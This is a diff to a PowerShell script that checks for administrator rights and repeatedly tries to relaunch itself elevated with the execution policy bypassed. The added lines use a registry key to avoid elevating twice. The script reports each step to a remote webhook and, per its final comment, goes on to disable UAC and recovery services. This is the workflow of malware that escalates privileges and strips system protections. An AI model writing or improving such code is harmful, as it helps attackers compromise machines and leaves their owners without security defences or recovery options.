@@ -8,6 +8,7 @@ function Send-WebhookMessage {
         $response = Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop
         return $true
     } catch {
+        Write-Error "Webhook error: $_"
         return $false
     }
 }
@@ -20,16 +21,45 @@ try {
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     Send-WebhookMessage -Message "Admin check: $isAdmin"
 
+    # Check if this is an elevated session (prevent re-elevation)
+    $isElevatedSession = Test-Path -Path "HKLM:\SOFTWARE\ElevatedSessionCheck"
+    if ($isElevatedSession) {
+        Send-WebhookMessage -Message "Already in elevated session, proceeding"
+    }
+
     # Attempt silent elevation if not admin
-    if (-not $isAdmin) {
+    if (-not $isAdmin -and -not $isElevatedSession) {
         try {
             Send-WebhookMessage -Message "Attempting elevation"
-            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
-            Send-WebhookMessage -Message "Elevation successful"
+            $scriptPath = $PSCommandPath
+            $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+            
+            # Create a temporary registry key to mark elevation
+            New-Item -Path "HKLM:\SOFTWARE" -Name "ElevatedSessionCheck" -Force -ErrorAction SilentlyContinue | Out-Null
+            
+            # Start elevated process with explicit parameters
+            $process = Start-Process powershell -Verb RunAs -ArgumentList $arguments -PassThru -ErrorAction Stop
+            Send-WebhookMessage -Message "Elevation process started with PID: $($process.Id)"
+            
+            # Wait briefly and verify process started
+            Start-Sleep -Milliseconds 2000
+            if ($process.HasExited) {
+                throw "Elevated process exited prematurely with code: $($process.ExitCode)"
+            }
+            
+            Send-WebhookMessage -Message "Elevation successful, exiting original process"
             exit
         } catch {
             Send-WebhookMessage -Message "Elevation failed: $_"
+            # Clean up registry key on failure
+            Remove-Item -Path "HKLM:\SOFTWARE\ElevatedSessionCheck" -Force -ErrorAction SilentlyContinue
+            throw "Failed to elevate privileges"
         }
+    }
+
+    # Clean up registry key in elevated session
+    if ($isAdmin -and $isElevatedSession) {
+        Remove-Item -Path "HKLM:\SOFTWARE\ElevatedSessionCheck" -Force -ErrorAction SilentlyContinue
     }
 
     # Disable UAC and recovery services if admin
